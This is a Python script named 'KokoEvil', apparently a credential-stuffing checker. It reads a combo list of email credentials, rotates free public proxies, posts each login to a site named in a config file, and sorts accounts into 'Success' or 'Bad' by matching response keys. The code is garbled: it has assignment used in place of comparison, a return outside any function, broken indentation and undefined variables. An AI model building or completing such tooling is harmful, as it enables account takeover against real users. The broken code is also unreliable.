# KokoEvil
import requests 
import json
print("""

All In One By KokoD3veloper
Thanks all friends
https://github.com/KokoD3veloper


 __  ___   ______    __  ___   ______    ___________    ____  __   __      
|  |/  /  /  __  \  |  |/  /  /  __  \  |   ____\   \  /   / |  | |  |     
|  '  /  |  |  |  | |  '  /  |  |  |  | |  |__   \   \/   /  |  | |  |     
|    <   |  |  |  | |    <   |  |  |  | |   __|   \      /   |  | |  |     
|  .  \  |  `--'  | |  .  \  |  `--'  | |  |____   \    /    |  | |  `----.
|__|\__\  \______/  |__|\__\  \______/  |_______|   \__/     |__| |_______|
                                                                           


                                                                                     """)
def find_between(s, first, last):
    try:
        start = s.index(first) + len(first)
        end = s.index(last, start)
        return s[start:end]
    except ValueError:
        return ""
config = input("Config Name: (With .txt ) ")
proxy = input("Proxy Yes / No : ")
if proxy = "Yes":
 proxyre = "True"
 return proxyre
f = open("configs/" + config, encoding='utf8').readlines()
combolist = open("mailcombo.txt", "r").readlines()
 for lines in combolist:
  proxy = requests.get("http://pubproxy.com/api/proxy?limit=1&format=txt&type=https")
  proxies = {
      "https": proxy

  }
  for lines in file:
    if "Site = " in f:
     link = lines.split("Site = ")[0]
    if proxy = "True":
     tokene = requests.post(link, proxies=proxies, data=data)
     print("Success Block ---> POST")
    if "SKEYCHECK" in f:
      SuccessKey = lines.split("SKEYCHECK = ")[0]
      if SuccessKey in tokene:
        print("Success Account")

    if "FKEYCHECK" in f:
      FailKey = lines.split("FKEYCHECK = ")[0]
      if FailKey in tokene:
        print("Bad Account")
